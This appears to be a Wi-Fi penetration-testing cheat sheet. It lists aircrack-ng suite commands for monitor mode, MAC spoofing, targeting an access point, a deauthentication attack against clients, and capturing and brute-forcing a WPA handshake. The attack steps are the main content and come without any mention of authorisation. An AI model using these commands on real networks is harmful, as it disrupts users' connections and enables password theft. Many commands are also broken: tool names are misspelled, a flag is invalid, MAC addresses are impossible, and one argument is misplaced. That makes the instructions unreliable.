## WIFI PENTESTIING COURSE

__Basic Commands:__

```console
ifconfig 		--------Show Network Interfaces
ifconfig -a  		--------Show All Network Interfaces (active and Inactive)
ifconfig eth0		--------Show Config of Eth0
ifconfig eth0 Down	--------Disable eth0
ifconfig eth0 up 	--------Enable eth0
ifconfig eth0 172.16.0.1 netmask 255.255.255.0 -------Change Ip
ifconfig eth0 hw ether 7H:2J:7H:2J:7H:2J:7H:2J
iwconfig 		--------Show Info About network interfaces
```


__Moniter Mode__

```console
ifconfig wlan0 up ---------Up Your Card
airmon-ng -----------------Check Weather Card is Detected by Airmon
arimon-ng check -----------Check The Processes Which can cause Some Trouble
airmon-ng check kill--------Check the process which can cause the problem and kill them.
airmong-ng start wlan0 ------Start Monitering Mode on Wlan0
airmong-ng stop wlan0--------Stop The Monitering Interface
```

__Sniffing__

```console
wireshark and Select The interface 


__Dumping mode-[Check Hosts and Network Clients]-__

```console
airmong-ng start wlan0 ------Start Monitering Mode on Wlan0
airodump mon1 		-----Moniter traffic on CLI without saving
```


__Macchanging__

```console
ifdown wlan0 					--------bring Down Your Network Interface
macchanger -r wlan0  				-------Give me Some Random Mac Address
macchager -m  fe80::4ad2:24ff:fe4c:28f4 	------------Change Mac to fe80::
```

__Moniterign Specific AP__

```console
airmon-ng start wlan0 				------Start Moniter Mode
airodump-ng wlan0mon				------Listne to all Networks
airdump-ng --bssid [Bssid of AP] wlan0mon	------Listne to Only One AP
```



__Deauthantication Attack__

```console
airmon-ng start wlan0
airdump-ng start --channel 11 --bssid 1K:3U:9U:5U:K8:O5 wlan0mon   
>>Stop ofter 10 sec
>>Copy Bssid of Client 
aireplay-ng --dauth 2000 -a [your mac] -c [client mac] wlan0mon
```



__Cracking AP with Bruteforcing Handshake__

```console
airmon-ng start walan0
airodump-ng start wlan
	>>Copy The bssid of AP
airodump-ng --bssid EC:8C:A2:04:F3:A8 --channel 11 wlan0mon --write packets
	>>net Tab
aireplay-ng --dauth 2000 -a [your mac] -c [client mac] wlan0mon
	>>wait 20 sec
aircrack-ng packets.cap /usr/share/wordlists
airdecap-ng -e 'HKBK-WIF' -p password packets.cap
```
